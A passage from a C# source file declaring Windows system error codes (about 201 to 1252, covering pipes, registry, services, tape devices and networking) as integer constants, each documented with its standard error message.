        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_RELOC_CHAIN_XEEDS_SEGLIM = 201;
        /// <summary>
        /// The operating system cannot run %1.
        /// </summary>
        public const int ERROR_INFLOOP_IN_RELOC_CHAIN = 202;
        /// <summary>
        /// The system could not find the environment option that was entered.
        /// </summary>
        public const int ERROR_ENVVAR_NOT_FOUND = 203;
        /// <summary>
        /// No process in the command subtree has a signal handler.
        /// </summary>
        public const int ERROR_NO_SIGNAL_SENT = 205;
        /// <summary>
        /// The filename or extension is too long.
        /// </summary>
        public const int ERROR_FILENAME_EXCED_RANGE = 206;
        /// <summary>
        /// The ring 2 stack is in use.
        /// </summary>
        public const int ERROR_RING2_STACK_IN_USE = 207;
        /// <summary>
        /// The global filename characters, * or ?, are entered incorrectly or too many global filename characters are specified.
        /// </summary>
        public const int ERROR_META_EXPANSION_TOO_Int32 = 208;
        /// <summary>
        /// The signal being posted is not correct.
        /// </summary>
        public const int ERROR_INVALID_SIGNAL_NUMBER = 209;
        /// <summary>
        /// The signal handler cannot be set.
        /// </summary>
        public const int ERROR_THREAD_1_INACTIVE = 210;
        /// <summary>
        /// The segment is locked and cannot be reallocated.
        /// </summary>
        public const int ERROR_LOCKED = 212;
        /// <summary>
        /// Too many dynamic-link modules are attached to this program or dynamic-link module.
        /// </summary>
        public const int ERROR_TOO_MANY_MODULES = 214;
        /// <summary>
        /// Cannot nest calls to LoadModule.
        /// </summary>
        public const int ERROR_NESTING_NOT_ALLOWED = 215;
        /// <summary>
        /// The image file %1 is valid, but is for a machine type other than the current machine.
        /// </summary>
        public const int ERROR_EXE_MACHINE_TYPE_MISMATCH = 216;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_EXE_CANNOT_MODIFY_SIGNED_BINARY = 217;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_EXE_CANNOT_MODIFY_STRONG_SIGNED_BINARY = 218;
        /// <summary>
        /// The pipe state is invalid.
        /// </summary>
        public const int ERROR_BAD_PIPE = 230;
        /// <summary>
        /// All pipe instances are busy.
        /// </summary>
        public const int ERROR_PIPE_BUSY = 231;
        /// <summary>
        /// The pipe is being closed.
        /// </summary>
        public const int ERROR_NO_DATA = 232;
        /// <summary>
        /// No process is on the other end of the pipe.
        /// </summary>
        public const int ERROR_PIPE_NOT_CONNECTED = 233;
        /// <summary>
        /// More data is available.
        /// </summary>
        public const int ERROR_MORE_DATA = 234;
        /// <summary>
        /// The session was canceled.
        /// </summary>
        public const int ERROR_VC_DISCONNECTED = 240;
        /// <summary>
        /// The specified extended attribute name was invalid.
        /// </summary>
        public const int ERROR_INVALID_EA_NAME = 254;
        /// <summary>
        /// The extended attributes are inconsistent.
        /// </summary>
        public const int ERROR_EA_LIST_INCONSISTENT = 255;
        /// <summary>
        /// The wait operation timed out.
        /// </summary>
        public const int WAIT_TIMEOUT = 258;
        /// <summary>
        /// No more data is available.
        /// </summary>
        public const int ERROR_NO_MORE_ITEMS = 259;
        /// <summary>
        /// The copy functions cannot be used.
        /// </summary>
        public const int ERROR_CANNOT_COPY = 266;
        /// <summary>
        /// The directory name is invalid.
        /// </summary>
        public const int ERROR_DIRECTORY = 267;
        /// <summary>
        /// The extended attributes did not fit in the buffer.
        /// </summary>
        public const int ERROR_EAS_DIDNT_FIT = 275;
        /// <summary>
        /// The extended attribute file on the mounted file system is corrupt.
        /// </summary>
        public const int ERROR_EA_FILE_CORRUPT = 276;
        /// <summary>
        /// The extended attribute table file is full.
        /// </summary>
        public const int ERROR_EA_TABLE_FULL = 277;
        /// <summary>
        /// The specified extended attribute handle is invalid.
        /// </summary>
        public const int ERROR_INVALID_EA_HANDLE = 278;
        /// <summary>
        /// The mounted file system does not support extended attributes.
        /// </summary>
        public const int ERROR_EAS_NOT_SUPPORTED = 282;
        /// <summary>
        /// Attempt to release mutex not owned by caller.
        /// </summary>
        public const int ERROR_NOT_OWNER = 288;
        /// <summary>
        /// Too many posts were made to a semaphore.
        /// </summary>
        public const int ERROR_TOO_MANY_POSTS = 298;
        /// <summary>
        /// Only part of a ReadProcessMemory or WriteProcessMemory request was completed.
        /// </summary>
        public const int ERROR_PARTIAL_COPY = 299;
        /// <summary>
        /// The oplock request is denied.
        /// </summary>
        public const int ERROR_OPLOCK_NOT_GRANTED = 300;
        /// <summary>
        /// An invalid oplock acknowledgment was received by the system.
        /// </summary>
        public const int ERROR_INVALID_OPLOCK_PROTOCOL = 301;
        /// <summary>
        /// The volume is too fragmented to complete this operation.
        /// </summary>
        public const int ERROR_DISK_TOO_FRAGMENTED = 302;
        /// <summary>
        /// The file cannot be opened because it is in the process of being deleted.
        /// </summary>
        public const int ERROR_DELETE_PENDING = 303;
        /// <summary>
        /// The system cannot find message text for message number 0x%1 in the message file for %2.
        /// </summary>
        public const int ERROR_MR_MID_NOT_FOUND = 317;
        /// <summary>
        /// No information avialable.
        /// </summary>
        public const int ERROR_SCOPE_NOT_FOUND = 318;
        /// <summary>
        /// Attempt to access invalid address.
        /// </summary>
        public const int ERROR_INVALID_ADDRESS = 487;
        /// <summary>
        /// Arithmetic result exceeded 32 bits.
        /// </summary>
        public const int ERROR_ARITHMETIC_OVERFLOW = 534;
        /// <summary>
        /// There is a process on other end of the pipe.
        /// </summary>
        public const int ERROR_PIPE_CONNECTED = 535;
        /// <summary>
        /// Waiting for a process to open the other end of the pipe.
        /// </summary>
        public const int ERROR_PIPE_LISTENING = 536;
        /// <summary>
        /// Access to the extended attribute was denied.
        /// </summary>
        public const int ERROR_EA_ACCESS_DENIED = 994;
        /// <summary>
        /// The I/O operation has been aborted because of either a thread exit or an application request.
        /// </summary>
        public const int ERROR_OPERATION_ABORTED = 995;
        /// <summary>
        /// Overlapped I/O event is not in a signaled state.
        /// </summary>
        public const int ERROR_IO_INCOMPLETE = 996;
        /// <summary>
        /// Overlapped I/O operation is in progress.
        /// </summary>
        public const int ERROR_IO_PENDING = 997;
        /// <summary>
        /// Invalid access to memory location.
        /// </summary>
        public const int ERROR_NOACCESS = 998;
        /// <summary>
        /// Error performing inpage operation.
        /// </summary>
        public const int ERROR_SWAPERROR = 999;
        /// <summary>
        /// Recursion too deep; the stack overflowed.
        /// </summary>
        public const int ERROR_STACK_OVERFLOW = 1001;
        /// <summary>
        /// The window cannot act on the sent message.
        /// </summary>
        public const int ERROR_INVALID_MESSAGE = 1002;
        /// <summary>
        /// Cannot complete this function.
        /// </summary>
        public const int ERROR_CAN_NOT_COMPLETE = 1003;
        /// <summary>
        /// Invalid flags.
        /// </summary>
        public const int ERROR_INVALID_FLAGS = 1004;
        /// <summary>
        /// The volume does not contain a recognized file system.
        /// Please make sure that all required file system drivers are loaded and that the volume is not corrupted.
        /// </summary>
        public const int ERROR_UNRECOGNIZED_VOLUME = 1005;
        /// <summary>
        /// The volume for a file has been externally altered so that the opened file is no longer valid.
        /// </summary>
        public const int ERROR_FILE_INVALID = 1006;
        /// <summary>
        /// The requested operation cannot be performed in full-screen mode.
        /// </summary>
        public const int ERROR_FULLSCREEN_MODE = 1007;
        /// <summary>
        /// An attempt was made to reference a token that does not exist.
        /// </summary>
        public const int ERROR_NO_TOKEN = 1008;
        /// <summary>
        /// The configuration registry database is corrupt.
        /// </summary>
        public const int ERROR_BADDB = 1009;
        /// <summary>
        /// The configuration registry key is invalid.
        /// </summary>
        public const int ERROR_BADKEY = 1010;
        /// <summary>
        /// The configuration registry key could not be opened.
        /// </summary>
        public const int ERROR_CANTOPEN = 1011;
        /// <summary>
        /// The configuration registry key could not be read.
        /// </summary>
        public const int ERROR_CANTREAD = 1012;
        /// <summary>
        /// The configuration registry key could not be written.
        /// </summary>
        public const int ERROR_CANTWRITE = 1013;
        /// <summary>
        /// One of the files in the registry database had to be recovered by use of a log or alternate copy. The recovery was successful.
        /// </summary>
        public const int ERROR_REGISTRY_RECOVERED = 1014;
        /// <summary>
        /// The registry is corrupted. The structure of one of the files containing registry data is corrupted, or the system's memory image of the file is corrupted, or the file could not be recovered because the alternate copy or log was absent or corrupted.
        /// </summary>
        public const int ERROR_REGISTRY_CORRUPT = 1015;
        /// <summary>
        /// An I/O operation initiated by the registry failed unrecoverably. The registry could not read in, or write out, or flush, one of the files that contain the system's image of the registry.
        /// </summary>
        public const int ERROR_REGISTRY_IO_FAILED = 1016;
        /// <summary>
        /// The system has attempted to load or restore a file into the registry, but the specified file is not in a registry file format.
        /// </summary>
        public const int ERROR_NOT_REGISTRY_FILE = 1017;
        /// <summary>
        /// Illegal operation attempted on a registry key that has been marked for deletion.
        /// </summary>
        public const int ERROR_KEY_DELETED = 1018;
        /// <summary>
        /// System could not allocate the required space in a registry log.
        /// </summary>
        public const int ERROR_NO_LOG_SPACE = 1019;
        /// <summary>
        /// Cannot create a symbolic link in a registry key that already has subkeys or values.
        /// </summary>
        public const int ERROR_KEY_HAS_CHILDREN = 1020;
        /// <summary>
        /// Cannot create a stable subkey under a volatile parent key.
        /// </summary>
        public const int ERROR_CHILD_MUST_BE_VOLATILE = 1021;
        /// <summary>
        /// A notify change request is being completed and the information is not being returned in the caller's buffer. The caller now needs to enumerate the files to find the changes.
        /// </summary>
        public const int ERROR_NOTIFY_ENUM_DIR = 1022;
        /// <summary>
        /// A stop control has been sent to a service that other running services are dependent on.
        /// </summary>
        public const int ERROR_DEPENDENT_SERVICES_RUNNING = 1051;
        /// <summary>
        /// The requested control is not valid for this service.
        /// </summary>
        public const int ERROR_INVALID_SERVICE_CONTROL = 1052;
        /// <summary>
        /// The service did not respond to the start or control request in a timely fashion.
        /// </summary>
        public const int ERROR_SERVICE_REQUEST_TIMEOUT = 1053;
        /// <summary>
        /// A thread could not be created for the service.
        /// </summary>
        public const int ERROR_SERVICE_NO_THREAD = 1054;
        /// <summary>
        /// The service database is locked.
        /// </summary>
        public const int ERROR_SERVICE_DATABASE_LOCKED = 1055;
        /// <summary>
        /// An instance of the service is already running.
        /// </summary>
        public const int ERROR_SERVICE_ALREADY_RUNNING = 1056;
        /// <summary>
        /// The account name is invalid or does not exist, or the password is invalid for the account name specified.
        /// </summary>
        public const int ERROR_INVALID_SERVICE_ACCOUNT = 1057;
        /// <summary>
        /// The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
        /// </summary>
        public const int ERROR_SERVICE_DISABLED = 1058;
        /// <summary>
        /// Circular service dependency was specified.
        /// </summary>
        public const int ERROR_CIRCULAR_DEPENDENCY = 1059;
        /// <summary>
        /// The specified service does not exist as an installed service.
        /// </summary>
        public const int ERROR_SERVICE_DOES_NOT_EXIST = 1060;
        /// <summary>
        /// The service cannot accept control messages at this time.
        /// </summary>
        public const int ERROR_SERVICE_CANNOT_ACCEPT_CTRL = 1061;
        /// <summary>
        /// The service has not been started.
        /// </summary>
        public const int ERROR_SERVICE_NOT_ACTIVE = 1062;
        /// <summary>
        /// The service process could not connect to the service controller.
        /// </summary>
        public const int ERROR_FAILED_SERVICE_CONTROLLER_CONNECT = 1063;
        /// <summary>
        /// An exception occurred in the service when handling the control request.
        /// </summary>
        public const int ERROR_EXCEPTION_IN_SERVICE = 1064;
        /// <summary>
        /// The database specified does not exist.
        /// </summary>
        public const int ERROR_DATABASE_DOES_NOT_EXIST = 1065;
        /// <summary>
        /// The service has returned a service-specific error code.
        /// </summary>
        public const int ERROR_SERVICE_SPECIFIC_ERROR = 1066;
        /// <summary>
        /// The process terminated unexpectedly.
        /// </summary>
        public const int ERROR_PROCESS_ABORTED = 1067;
        /// <summary>
        /// The dependency service or group failed to start.
        /// </summary>
        public const int ERROR_SERVICE_DEPENDENCY_FAIL = 1068;
        /// <summary>
        /// The service did not start due to a logon failure.
        /// </summary>
        public const int ERROR_SERVICE_LOGON_FAILED = 1069;
        /// <summary>
        /// After starting, the service hung in a start-pending state.
        /// </summary>
        public const int ERROR_SERVICE_START_HANG = 1070;
        /// <summary>
        /// The specified service database lock is invalid.
        /// </summary>
        public const int ERROR_INVALID_SERVICE_LOCK = 1071;
        /// <summary>
        /// The specified service has been marked for deletion.
        /// </summary>
        public const int ERROR_SERVICE_MARKED_FOR_DELETE = 1072;
        /// <summary>
        /// The specified service already exists.
        /// </summary>
        public const int ERROR_SERVICE_EXISTS = 1073;
        /// <summary>
        /// The system is currently running with the last-known-good configuration.
        /// </summary>
        public const int ERROR_ALREADY_RUNNING_LKG = 1074;
        /// <summary>
        /// The dependency service does not exist or has been marked for deletion.
        /// </summary>
        public const int ERROR_SERVICE_DEPENDENCY_DELETED = 1075;
        /// <summary>
        /// The current boot has already been accepted for use as the last-known-good control set.
        /// </summary>
        public const int ERROR_BOOT_ALREADY_ACCEPTED = 1076;
        /// <summary>
        /// No attempts to start the service have been made since the last boot.
        /// </summary>
        public const int ERROR_SERVICE_NEVER_STARTED = 1077;
        /// <summary>
        /// The name is already in use as either a service name or a service display name.
        /// </summary>
        public const int ERROR_DUPLICATE_SERVICE_NAME = 1078;
        /// <summary>
        /// The account specified for this service is different from the account specified for other services running in the same process.
        /// </summary>
        public const int ERROR_DIFFERENT_SERVICE_ACCOUNT = 1079;
        /// <summary>
        /// Failure actions can only be set for Win32 services, not for drivers.
        /// </summary>
        public const int ERROR_CANNOT_DETECT_DRIVER_FAILURE = 1080;
        /// <summary>
        /// This service runs in the same process as the service control manager.
        /// Therefore, the service control manager cannot take action if this service's process terminates unexpectedly.
        /// </summary>
        public const int ERROR_CANNOT_DETECT_PROCESS_ABORT = 1081;
        /// <summary>
        /// No recovery program has been configured for this service.
        /// </summary>
        public const int ERROR_NO_RECOVERY_PROGRAM = 1082;
        /// <summary>
        /// The executable program that this service is configured to run in does not implement the service.
        /// </summary>
        public const int ERROR_SERVICE_NOT_IN_EXE = 1083;
        /// <summary>
        /// This service cannot be started in Safe Mode
        /// </summary>
        public const int ERROR_NOT_SAFEBOOT_SERVICE = 1084;
        /// <summary>
        /// The physical end of the tape has been reached.
        /// </summary>
        public const int ERROR_END_OF_MEDIA = 1100;
        /// <summary>
        /// A tape access reached a filemark.
        /// </summary>
        public const int ERROR_FILEMARK_DETECTED = 1101;
        /// <summary>
        /// The beginning of the tape or a partition was encountered.
        /// </summary>
        public const int ERROR_BEGINNING_OF_MEDIA = 1102;
        /// <summary>
        /// A tape access reached the end of a set of files.
        /// </summary>
        public const int ERROR_SETMARK_DETECTED = 1103;
        /// <summary>
        /// No more data is on the tape.
        /// </summary>
        public const int ERROR_NO_DATA_DETECTED = 1104;
        /// <summary>
        /// Tape could not be partitioned.
        /// </summary>
        public const int ERROR_PARTITION_FAILURE = 1105;
        /// <summary>
        /// When accessing a new tape of a multivolume partition, the current block size is incorrect.
        /// </summary>
        public const int ERROR_INVALID_BLOCK_LENGTH = 1106;
        /// <summary>
        /// Tape partition information could not be found when loading a tape.
        /// </summary>
        public const int ERROR_DEVICE_NOT_PARTITIONED = 1107;
        /// <summary>
        /// Unable to lock the media eject mechanism.
        /// </summary>
        public const int ERROR_UNABLE_TO_LOCK_MEDIA = 1108;
        /// <summary>
        /// Unable to unload the media.
        /// </summary>
        public const int ERROR_UNABLE_TO_UNLOAD_MEDIA = 1109;
        /// <summary>
        /// The media in the drive may have changed.
        /// </summary>
        public const int ERROR_MEDIA_CHANGED = 1110;
        /// <summary>
        /// The I/O bus was reset.
        /// </summary>
        public const int ERROR_BUS_RESET = 1111;
        /// <summary>
        /// No media in drive.
        /// </summary>
        public const int ERROR_NO_MEDIA_IN_DRIVE = 1112;
        /// <summary>
        /// No mapping for the Unicode character exists in the target multi-byte code page.
        /// </summary>
        public const int ERROR_NO_UNICODE_TRANSLATION = 1113;
        /// <summary>
        /// A dynamic link library (DLL) initialization routine failed.
        /// </summary>
        public const int ERROR_DLL_INIT_FAILED = 1114;
        /// <summary>
        /// A system shutdown is in progress.
        /// </summary>
        public const int ERROR_SHUTDOWN_IN_PROGRESS = 1115;
        /// <summary>
        /// Unable to abort the system shutdown because no shutdown was in progress.
        /// </summary>
        public const int ERROR_NO_SHUTDOWN_IN_PROGRESS = 1116;
        /// <summary>
        /// The request could not be performed because of an I/O device error.
        /// </summary>
        public const int ERROR_IO_DEVICE = 1117;
        /// <summary>
        /// No serial device was successfully initialized. The serial driver will unload.
        /// </summary>
        public const int ERROR_SERIAL_NO_DEVICE = 1118;
        /// <summary>
        /// Unable to open a device that was sharing an interrupt request (IRQ) with other devices. At least one other device that uses that IRQ was already opened.
        /// </summary>
        public const int ERROR_IRQ_BUSY = 1119;
        /// <summary>
        /// A serial I/O operation was completed by another write to the serial port.
        /// (The IOCTL_SERIAL_XOFF_COUNTER reached zero.)
        /// </summary>
        public const int ERROR_MORE_WRITES = 1120;
        /// <summary>
        /// A serial I/O operation completed because the timeout period expired.
        /// (The IOCTL_SERIAL_XOFF_COUNTER did not reach zero.)
        /// </summary>
        public const int ERROR_COUNTER_TIMEOUT = 1121;
        /// <summary>
        /// No ID address mark was found on the floppy disk.
        /// </summary>
        public const int ERROR_FLOPPY_ID_MARK_NOT_FOUND = 1122;
        /// <summary>
        /// Mismatch between the floppy disk sector ID field and the floppy disk controller track address.
        /// </summary>
        public const int ERROR_FLOPPY_WRONG_CYLINDER = 1123;
        /// <summary>
        /// The floppy disk controller reported an error that is not recognized by the floppy disk driver.
        /// </summary>
        public const int ERROR_FLOPPY_UNKNOWN_ERROR = 1124;
        /// <summary>
        /// The floppy disk controller returned inconsistent results in its registers.
        /// </summary>
        public const int ERROR_FLOPPY_BAD_REGISTERS = 1125;
        /// <summary>
        /// While accessing the hard disk, a recalibrate operation failed, even after retries.
        /// </summary>
        public const int ERROR_DISK_RECALIBRATE_FAILED = 1126;
        /// <summary>
        /// While accessing the hard disk, a disk operation failed even after retries.
        /// </summary>
        public const int ERROR_DISK_OPERATION_FAILED = 1127;
        /// <summary>
        /// While accessing the hard disk, a disk controller reset was needed, but even that failed.
        /// </summary>
        public const int ERROR_DISK_RESET_FAILED = 1128;
        /// <summary>
        /// Physical end of tape encountered.
        /// </summary>
        public const int ERROR_EOM_OVERFLOW = 1129;
        /// <summary>
        /// Not enough server storage is available to process this command.
        /// </summary>
        public const int ERROR_NOT_ENOUGH_SERVER_MEMORY = 1130;
        /// <summary>
        /// A potential deadlock condition has been detected.
        /// </summary>
        public const int ERROR_POSSIBLE_DEADLOCK = 1131;
        /// <summary>
        /// The base address or the file offset specified does not have the proper alignment.
        /// </summary>
        public const int ERROR_MAPPED_ALIGNMENT = 1132;
        /// <summary>
        /// An attempt to change the system power state was vetoed by another application or driver.
        /// </summary>
        public const int ERROR_SET_POWER_STATE_VETOED = 1140;
        /// <summary>
        /// The system BIOS failed an attempt to change the system power state.
        /// </summary>
        public const int ERROR_SET_POWER_STATE_FAILED = 1141;
        /// <summary>
        /// An attempt was made to create more links on a file than the file system supports.
        /// </summary>
        public const int ERROR_TOO_MANY_LINKS = 1142;
        /// <summary>
        /// The specified program requires a newer version of Windows.
        /// </summary>
        public const int ERROR_OLD_WIN_VERSION = 1150;
        /// <summary>
        /// The specified program is not a Windows or MS-DOS program.
        /// </summary>
        public const int ERROR_APP_WRONG_OS = 1151;
        /// <summary>
        /// Cannot start more than one instance of the specified program.
        /// </summary>
        public const int ERROR_SINGLE_INSTANCE_APP = 1152;
        /// <summary>
        /// The specified program was written for an earlier version of Windows.
        /// </summary>
        public const int ERROR_RMODE_APP = 1153;
        /// <summary>
        /// One of the library files needed to run this application is damaged.
        /// </summary>
        public const int ERROR_INVALID_DLL = 1154;
        /// <summary>
        /// No application is associated with the specified file for this operation.
        /// </summary>
        public const int ERROR_NO_ASSOCIATION = 1155;
        /// <summary>
        /// An error occurred in sending the command to the application.
        /// </summary>
        public const int ERROR_DDE_FAIL = 1156;
        /// <summary>
        /// One of the library files needed to run this application cannot be found.
        /// </summary>
        public const int ERROR_DLL_NOT_FOUND = 1157;
        /// <summary>
        /// The current process has used all of its system allowance of handles for Window Manager objects.
        /// </summary>
        public const int ERROR_NO_MORE_USER_HANDLES = 1158;
        /// <summary>
        /// The message can be used only with synchronous operations.
        /// </summary>
        public const int ERROR_MESSAGE_SYNC_ONLY = 1159;
        /// <summary>
        /// The indicated source element has no media.
        /// </summary>
        public const int ERROR_SOURCE_ELEMENT_EMPTY = 1160;
        /// <summary>
        /// The indicated destination element already contains media.
        /// </summary>
        public const int ERROR_DESTINATION_ELEMENT_FULL = 1161;
        /// <summary>
        /// The indicated element does not exist.
        /// </summary>
        public const int ERROR_ILLEGAL_ELEMENT_ADDRESS = 1162;
        /// <summary>
        /// The indicated element is part of a magazine that is not present.
        /// </summary>
        public const int ERROR_MAGAZINE_NOT_PRESENT = 1163;
        /// <summary>
        /// The indicated device requires reinitialization due to hardware errors.
        /// </summary>
        public const int ERROR_DEVICE_REINITIALIZATION_NEEDED = 1164;
        /// <summary>
        /// The device has indicated that cleaning is required before further operations are attempted.
        /// </summary>
        public const int ERROR_DEVICE_REQUIRES_CLEANING = 1165;
        /// <summary>
        /// The device has indicated that its door is open.
        /// </summary>
        public const int ERROR_DEVICE_DOOR_OPEN = 1166;
        /// <summary>
        /// The device is not connected.
        /// </summary>
        public const int ERROR_DEVICE_NOT_CONNECTED = 1167;
        /// <summary>
        /// Element not found.
        /// </summary>
        public const int ERROR_NOT_FOUND = 1168;
        /// <summary>
        /// There was no match for the specified key in the index.
        /// </summary>
        public const int ERROR_NO_MATCH = 1169;
        /// <summary>
        /// The property set specified does not exist on the object.
        /// </summary>
        public const int ERROR_SET_NOT_FOUND = 1170;
        /// <summary>
        /// The point passed to GetMouseMovePoints is not in the buffer.
        /// </summary>
        public const int ERROR_POINT_NOT_FOUND = 1171;
        /// <summary>
        /// The tracking (workstation) service is not running.
        /// </summary>
        public const int ERROR_NO_TRACKING_SERVICE = 1172;
        /// <summary>
        /// The Volume ID could not be found.
        /// </summary>
        public const int ERROR_NO_VOLUME_ID = 1173;
        /// <summary>
        /// Unable to remove the file to be replaced.
        /// </summary>
        public const int ERROR_UNABLE_TO_REMOVE_REPLACED = 1175;
        /// <summary>
        /// Unable to move the replacement file to the file to be replaced. The file to be replaced has retained its original name.
        /// </summary>
        public const int ERROR_UNABLE_TO_MOVE_REPLACEMENT = 1176;
        /// <summary>
        /// Unable to move the replacement file to the file to be replaced. The file to be replaced has been renamed using the backup name.
        /// </summary>
        public const int ERROR_UNABLE_TO_MOVE_REPLACEMENT_2 = 1177;
        /// <summary>
        /// The volume change journal is being deleted.
        /// </summary>
        public const int ERROR_JOURNAL_DELETE_IN_PROGRESS = 1178;
        /// <summary>
        /// The volume change journal is not active.
        /// </summary>
        public const int ERROR_JOURNAL_NOT_ACTIVE = 1179;
        /// <summary>
        /// A file was found, but it may not be the correct file.
        /// </summary>
        public const int ERROR_POTENTIAL_FILE_FOUND = 1180;
        /// <summary>
        /// The journal entry has been deleted from the journal.
        /// </summary>
        public const int ERROR_JOURNAL_ENTRY_DELETED = 1181;
        /// <summary>
        /// The specified device name is invalid.
        /// </summary>
        public const int ERROR_BAD_DEVICE = 1200;
        /// <summary>
        /// The device is not currently connected but it is a remembered connection.
        /// </summary>
        public const int ERROR_CONNECTION_UNAVAIL = 1201;
        /// <summary>
        /// The local device name has a remembered connection to another network resource.
        /// </summary>
        public const int ERROR_DEVICE_ALREADY_REMEMBERED = 1202;
        /// <summary>
        /// No network provider accepted the given network path.
        /// </summary>
        public const int ERROR_NO_NET_OR_BAD_PATH = 1203;
        /// <summary>
        /// The specified network provider name is invalid.
        /// </summary>
        public const int ERROR_BAD_PROVIDER = 1204;
        /// <summary>
        /// Unable to open the network connection profile.
        /// </summary>
        public const int ERROR_CANNOT_OPEN_PROFILE = 1205;
        /// <summary>
        /// The network connection profile is corrupted.
        /// </summary>
        public const int ERROR_BAD_PROFILE = 1206;
        /// <summary>
        /// Cannot enumerate a noncontainer.
        /// </summary>
        public const int ERROR_NOT_CONTAINER = 1207;
        /// <summary>
        /// An extended error has occurred.
        /// </summary>
        public const int ERROR_EXTENDED_ERROR = 1208;
        /// <summary>
        /// The format of the specified group name is invalid.
        /// </summary>
        public const int ERROR_INVALID_GROUPNAME = 1209;
        /// <summary>
        /// The format of the specified computer name is invalid.
        /// </summary>
        public const int ERROR_INVALID_COMPUTERNAME = 1210;
        /// <summary>
        /// The format of the specified event name is invalid.
        /// </summary>
        public const int ERROR_INVALID_EVENTNAME = 1211;
        /// <summary>
        /// The format of the specified domain name is invalid.
        /// </summary>
        public const int ERROR_INVALID_DOMAINNAME = 1212;
        /// <summary>
        /// The format of the specified service name is invalid.
        /// </summary>
        public const int ERROR_INVALID_SERVICENAME = 1213;
        /// <summary>
        /// The format of the specified network name is invalid.
        /// </summary>
        public const int ERROR_INVALID_NETNAME = 1214;
        /// <summary>
        /// The format of the specified share name is invalid.
        /// </summary>
        public const int ERROR_INVALID_SHARENAME = 1215;
        /// <summary>
        /// The format of the specified password is invalid.
        /// </summary>
        public const int ERROR_INVALID_PASSUInt16NAME = 1216;
        /// <summary>
        /// The format of the specified message name is invalid.
        /// </summary>
        public const int ERROR_INVALID_MESSAGENAME = 1217;
        /// <summary>
        /// The format of the specified message destination is invalid.
        /// </summary>
        public const int ERROR_INVALID_MESSAGEDEST = 1218;
        /// <summary>
        /// Multiple connections to a server or shared resource by the same user, using more than one user name, are not allowed. Disconnect all previous connections to the server or shared resource and try again..
        /// </summary>
        public const int ERROR_SESSION_CREDENTIAL_CONFLICT = 1219;
        /// <summary>
        /// An attempt was made to establish a session to a network server, but there are already too many sessions established to that server.
        /// </summary>
        public const int ERROR_REMOTE_SESSION_LIMIT_EXCEEDED = 1220;
        /// <summary>
        /// The workgroup or domain name is already in use by another computer on the network.
        /// </summary>
        public const int ERROR_DUP_DOMAINNAME = 1221;
        /// <summary>
        /// The network is not present or not started.
        /// </summary>
        public const int ERROR_NO_NETWORK = 1222;
        /// <summary>
        /// The operation was canceled by the user.
        /// </summary>
        public const int ERROR_CANCELLED = 1223;
        /// <summary>
        /// The requested operation cannot be performed on a file with a user-mapped section open.
        /// </summary>
        public const int ERROR_USER_MAPPED_FILE = 1224;
        /// <summary>
        /// The remote system refused the network connection.
        /// </summary>
        public const int ERROR_CONNECTION_REFUSED = 1225;
        /// <summary>
        /// The network connection was gracefully closed.
        /// </summary>
        public const int ERROR_GRACEFUL_DISCONNECT = 1226;
        /// <summary>
        /// The network transport endpoint already has an address associated with it.
        /// </summary>
        public const int ERROR_ADDRESS_ALREADY_ASSOCIATED = 1227;
        /// <summary>
        /// An address has not yet been associated with the network endpoint.
        /// </summary>
        public const int ERROR_ADDRESS_NOT_ASSOCIATED = 1228;
        /// <summary>
        /// An operation was attempted on a nonexistent network connection.
        /// </summary>
        public const int ERROR_CONNECTION_INVALID = 1229;
        /// <summary>
        /// An invalid operation was attempted on an active network connection.
        /// </summary>
        public const int ERROR_CONNECTION_ACTIVE = 1230;
        /// <summary>
        /// The network location cannot be reached. For information about network troubleshooting, see Windows Help.
        /// </summary>
        public const int ERROR_NETWORK_UNREACHABLE = 1231;
        /// <summary>
        /// The network location cannot be reached. For information about network troubleshooting, see Windows Help.
        /// </summary>
        public const int ERROR_HOST_UNREACHABLE = 1232;
        /// <summary>
        /// The network location cannot be reached. For information about network troubleshooting, see Windows Help.
        /// </summary>
        public const int ERROR_PROTOCOL_UNREACHABLE = 1233;
        /// <summary>
        /// No service is operating at the destination network endpoint on the remote system.
        /// </summary>
        public const int ERROR_PORT_UNREACHABLE = 1234;
        /// <summary>
        /// The request was aborted.
        /// </summary>
        public const int ERROR_REQUEST_ABORTED = 1235;
        /// <summary>
        /// The network connection was aborted by the local system.
        /// </summary>
        public const int ERROR_CONNECTION_ABORTED = 1236;
        /// <summary>
        /// The operation could not be completed. A retry should be performed.
        /// </summary>
        public const int ERROR_RETRY = 1237;
        /// <summary>
        /// A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.
        /// </summary>
        public const int ERROR_CONNECTION_COUNT_LIMIT = 1238;
        /// <summary>
        /// Attempting to log in during an unauthorized time of day for this account.
        /// </summary>
        public const int ERROR_LOGIN_TIME_RESTRICTION = 1239;
        /// <summary>
        /// The account is not authorized to log in from this station.
        /// </summary>
        public const int ERROR_LOGIN_WKSTA_RESTRICTION = 1240;
        /// <summary>
        /// The network address could not be used for the operation requested.
        /// </summary>
        public const int ERROR_INCORRECT_ADDRESS = 1241;
        /// <summary>
        /// The service is already registered.
        /// </summary>
        public const int ERROR_ALREADY_REGISTERED = 1242;
        /// <summary>
        /// The specified service does not exist.
        /// </summary>
        public const int ERROR_SERVICE_NOT_FOUND = 1243;
        /// <summary>
        /// The operation being requested was not performed because the user has not been authenticated.
        /// </summary>
        public const int ERROR_NOT_AUTHENTICATED = 1244;
        /// <summary>
        /// The operation being requested was not performed because the user has not logged on to the network.
        /// The specified service does not exist.
        /// </summary>
        public const int ERROR_NOT_LOGGED_ON = 1245;
        /// <summary>
        /// Continue with work in progress.
        /// </summary>
        public const int ERROR_CONTINUE = 1246;
        /// <summary>
        /// An attempt was made to perform an initialization operation when initialization has already been completed.
        /// </summary>
        public const int ERROR_ALREADY_INITIALIZED = 1247;
        /// <summary>
        /// No more local devices.
        /// </summary>
        public const int ERROR_NO_MORE_DEVICES = 1248;
        /// <summary>
        /// The specified site does not exist.
        /// </summary>
        public const int ERROR_NO_SUCH_SITE = 1249;
        /// <summary>
        /// A domain controller with the specified name already exists.
        /// </summary>
        public const int ERROR_DOMAIN_CONTROLLER_EXISTS = 1250;
        /// <summary>
        /// This operation is supported only when you are connected to the server.
        /// </summary>
        public const int ERROR_ONLY_IF_CONNECTED = 1251;
        /// <summary>
        /// The group policy framework should call the extension even if there are no changes.
        /// </summary>
        public const int ERROR_OVERRIDE_NOCHANGES = 1252;
        /// <summary>
        /// The specified user does not have a valid profile.
        /// </summary>
